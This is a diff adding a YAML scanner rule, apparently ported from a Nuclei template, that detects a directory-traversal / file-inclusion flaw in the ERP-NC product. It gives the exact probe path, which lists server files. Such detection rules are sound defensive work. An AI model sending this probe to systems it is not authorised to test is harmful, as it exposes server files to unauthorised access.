@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:erp-nc-directory-traversal"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "ERP-NC - Local File Inclusion"
+  description: "ERP-NC is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g"
+  cwes: [22]
+  tags: ["lfi", "erp-nc", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/NCFindWeb?service=IPreAlertConfigService&filename=" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "Client" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "ncwslogin.jsp" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "admin.jsp" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
